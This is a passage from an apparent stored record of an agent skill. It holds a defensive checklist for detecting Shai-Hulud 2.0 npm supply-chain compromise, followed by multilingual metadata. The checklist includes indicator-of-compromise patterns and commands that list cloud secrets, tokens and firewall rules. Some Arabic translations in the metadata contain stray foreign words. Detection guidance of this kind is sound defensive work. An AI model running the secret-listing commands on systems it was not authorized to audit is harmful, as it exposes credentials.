\"i\"))''\n\n# 2. Check for unexpected self-hosted runners\ngh api repos/{owner}/{repo}/actions/runners --jq ''.runners[] | {name, status, os}''\n# RED FLAG: runner named \"SHA1HULUD\"\n\n# 3. Check for injected workflows\nfind .github/workflows -name \"*.yml\" -newer package.json\n# RED FLAG: discussion.yaml or anything you did not create\n\n# 4. Check for unexpected GitHub Actions workflow runs\ngh run list --limit 20 --json name,status,createdAt\n# RED FLAG: \"Code Formatter\" workflow you did not create\n\n# 5. Check npm token activity\nbunx npm token list\n# RED FLAG: tokens you did not create\n\n# 6. Check npm package publish history\nbunx npm info <your-package> time\n# RED FLAG: recent publishes you did not make\n```\n\n### File System Checks\n\n```bash\n# 7. Check for Shai-Hulud artifacts\nfind ~ -name \"setup_bun.js\" -o -name \"bun_environment.js\" 2>/dev/null\n# RED FLAG: these files should not exist\n\n# 8. Check for unauthorized bun installations\nwhich -a bun\nls ~/.dev-env/ 2>/dev/null\n# RED FLAG: bun installed in unexpected locations (e.g., ~/.dev-env/)\n\n# 9. Check for modified DNS configuration\ncat /etc/resolv.conf\n# RED FLAG: unexpected DNS servers\n\n# 10. Check for modified firewall rules (Linux)\nsudo iptables -L OUTPUT 2>/dev/null\nsudo iptables -L DOCKER-USER 2>/dev/null\n# RED FLAG: rules have been deleted\n```\n\n### Process Checks\n\n```bash\n# 11. Check for suspicious background processes\nps aux | grep -E \"(bun_environment|setup_bun|SHA1HULUD)\"\n# RED FLAG: any matches\n\n# 12. Check for processes connecting to unexpected hosts\n# (requires lsof or ss)\nss -tunp | grep -v -E \"(127.0.0.1|::1|your-known-hosts)\"\n# RED FLAG: connections to unknown external hosts\n\n# 13. Check environment for Shai-Hulud markers\nenv | grep POSTINSTALL_BG\n# RED FLAG: POSTINSTALL_BG=1 means payload is running in background\n```\n\n### Cloud Credential Checks\n\n```bash\n# 14. AWS: Check for unauthorized access\naws sts get-caller-identity\naws secretsmanager list-secrets --region us-east-1\n# RED FLAG: access from unexpected principal or region\n\n# 15. GCP: Check for unauthorized access\ngcloud auth list\ngcloud secrets list 2>/dev/null\n# RED FLAG: unexpected service accounts\n\n# 16. Azure: Check for unauthorized access\naz account show\naz keyvault list 2>/dev/null\n# RED FLAG: unexpected subscriptions or vaults\n```\n\n### If Compromise Is Confirmed\n\n1. **Immediately rotate ALL credentials**:\n   - npm tokens\n   - GitHub PATs and SSH keys\n   - AWS/GCP/Azure credentials\n   - Any secrets stored in CI/CD\n   - Database passwords\n\n2. **Unpublish compromised package versions**\n\n3. **Remove unauthorized GitHub runners and workflows**\n\n4. **Review and revoke GitHub App authorizations**\n\n5. **Check git history for unauthorized commits**\n\n6. **Notify affected downstream users**\n\n7. **File incident report** with npm security (security@npmjs.com)\n\n## References\n\n- [Shai-Hulud 2.0 Technical Analysis - Trend Micro](https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)\n- [Bun Security - Subprocess API](https://bun.sh/docs/runtime/subprocess)\n- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)\n- [Node.js Security Best Practices](https://nodejs.org/en/learn/getting-started/security-best-practices)\n- [Socket.dev - Package Behavioral Analysis](https://socket.dev/)\n- [GitHub Fine-Grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#fine-grained-personal-access-tokens)\n"},"lastSynced":"2026-03-07T04:01:21.637Z","agentAnalysis":{"suitability":{"en":"Perfect for Security-Focused Agents needing robust TypeScript coding patterns to defend against supply chain attacks.","zh":"非常适合需要强大 TypeScript 编码模式以防御供应链攻击的安全导向型 Agent。","ja":"サプライチェーン攻撃に対する防御を目的とした堅牢な TypeScript コーディングパターンを必要とする、セキュリティ重視の Agent に最適です。","ko":"공급망 공격을 방어하기 위해 강력한 TypeScript 코딩 패턴이 필요한 보안 중심 에이전트에 완벽합니다.","es":"Perfecto para agentes de seguridad que necesitan patrones de codificación robustos de TypeScript para defenderse contra ataques de cadena de suministro.","fr":"Parfait pour les agents axés sur la sécurité qui ont besoin de modèles de codage robustes TypeScript pour se défendre contre les attaques de chaîne d''approvisionnement.","de":"Perfekt für sicherheitsorientierte Agenten, die robuste TypeScript-Codiermuster benötigen, um sich gegen Angriffe auf die Lieferkette zu verteidigen.","pt":"Perfeito para Agentes com Foco em Segurança que precisam de padrões de codificação robustos do TypeScript para defender contra ataques de cadeia de suprimentos.","ru":"Идеально подходит для агентов, ориентированных на безопасность, которым необходимы прочные шаблоны кодирования TypeScript для защиты от атак на цепочку поставок.","ar":"مثالي للوكلاء الذين يركزون على الأمن وهم في حاجة إلى أنماط kod الترميز قوية من TypeScript لمنع الهجمات على سلسلة التوريد."},"recommendation":{"en":"Empowers agents to secure application code by providing defensive coding patterns against supply chain attacks, handling credentials and tokens with secure protocols, and ensuring safe dependency loading and execution using TypeScript.","zh":"通过提供针对供应链攻击的防御性编码模式、使用安全协议处理凭据和令牌，并利用 TypeScript 确保安全的依赖项加载和执行，使 Agent 能够保护应用程序代码。","ja":"サプライチェーン攻撃に対する防御的コーディングパターンの提供、安全なプロトコルによる資格情報とトークンの取り扱い、TypeScript を使用した安全な依存関係のロードと実行の保証を通じて、Agent がアプリケーションコードを保護できるようにします。","ko":"공급망 공격에 대한 방어적 코딩 패턴 제공, 보안 프로토콜을 사용한 자격 증명 및 토큰 처리, TypeScript를 사용한 안전한 종속성 로드 및 실행 보장을 통해 에이전트가 애플리케이션 코드를 보호할 수 있도록 합니다.","es":"Habilita a los agentes a proteger el código de la aplicación proporcionando patrones de codificación defensivos contra ataques de cadena de suministro, manipulando credenciales y tokens con protocolos seguros y garantizando una carga y ejecución de dependencias seguras utilizando TypeScript.","fr":"Permet aux agents de sécuriser le code de l''application en fournissant des modèles de codage défensifs contre les attaques de chaîne d''approvisionnement, en gérant les informations d''identification et les clés API avec des protocoles sécurisés et en assurant un chargement et une exécution de dépendances sécurisés à l''aide de TypeScript.","de":"Ermächtigt die Agenten, den Anwendungscode zu sichern, indem sie Verteidigungscodingmuster gegen Lieferkettenangriffe bereitstellen, Anmeldeinformationen und Token mit sicheren Protokollen handhaben und eine sichere Abhängigkeitsladung und -ausführung mit TypeScript gewährleisten.","pt":"Habilita os agentes a proteger o código da aplicação fornecendo padrões de codificação defensivos contra ataques de cadeia de suprimentos, lidando com credenciais e tokens com protocolos seguros e garantindo o carregamento e a execução seguros de dependências usando o TypeScript.","ru":"Наделяет агентов возможностью защищать код приложения, предоставляя оборонительные шаблоны кодирования против атак на цепочку поставок, обрабатывая учетные данные и токены с помощью безопасных протоколов и обеспечивая безопасную загрузку и выполнение зависимостей с помощью TypeScript.","ar":"تمكّن الوكلاء من حماية код التطبيق من خلال توفير أنماط الترميز الدفاعية ضد الهجمات على سلسلة التوريد، وتعامل مع بيانات الاعتماد والرموز الأمنية ببروتوكولات آمنة، وضمان تحميل وتنفيذ依赖ات آمن باستخدام TypeScript."},"useCases":{"en":["Securing third-party package imports","Protecting credentials and API keys in code","Validating dependency execution for child processes"],"zh":["保护第三方软件包导入","保护代码中的凭据和 API 密钥","验证子进程的依赖项执行"],"ja":["サードパーティパッケージのインポートの保護","コード内の資格情報と API キーの保護","子プロセスに対する依存関係の実行の検証"],"ko":["타사 패키지 가입 보안","코드 내 자격 증명 및 API 키 보호","자식 프로세스를 위한 종속성 실행 검증"],"es":["Seguridad de las importaciones de paquetes de terceros","Protección de credenciales y claves API en el código","Validación de la ejecución de dependencias para procesos secundarios"],"fr":["Sécurité des imports de packages tiers","Protection des informations d''identification et des clés API dans le code","Validation de l''exécution des dépendances pour les processus enfants"],"de":["Sicherheit von Drittanbieter-Paket-Importen","Schutz von Anmeldeinformationen und API-Schlüsseln im Code","Validierung der Ausführung von Abhängigkeiten für untergeordnete Prozesse"],"pt":["Proteger imports de pacotes de terceiros","Proteger credenciais e chaves de API no código","Validar execução de dependência para processos filhos"],"ru":["Защищать импорт пакетов третьих сторон","Защищать учетные данные и ключи API в коде","Проверять выполнение зависимостей для дочерних процессов"],"ar":["حماية استيراد حزم الطرف الثالث","حماية بيانات الاعتماد ومفاتيح API في الكود","التحقق من تنفيذ الإعتماد للمعالجات الفرعية"]},"limitations":{"en":["Requires TypeScript environment","Focused on application code level security"],"zh":["需要 TypeScript 环境","专注于应用程序代码级别的安全性"],"ja":["TypeScript 環境が必要","アプリケーションコードレベルのセキュリティに焦点を当てている"],"ko":["TypeScript 환경이 필요함","애플리케이션 코드 수준의 보안에 중점을 둠"],"es":["Requiere entorno de TypeScript","Se centra en la seguridad a nivel de código de aplicación"],"fr":["Nécessite un environnement TypeScript","Axé sur la sécurité au niveau du code de l''application"],"de":["Benötigt eine TypeScript-Umgebung","Konzentriert sich auf die Sicherheit auf Anwendungscod-Ebene"],"pt":["Exige ambiente do TypeScript","Focado em nível de segurança de código de aplicação"],"ru":["Требует среды TypeScript","Фокусируется на уровне безопасности кода приложения"],"ar":["يتطلب بيئة TypeScript","يركز على مستوى أمان код التطبيق"]},"version":4},"contentHash":"fb09b82a13ccc4fb328e75a500aced42007a381c80479af5197373b9a6a2a561","qualityScore":45}');
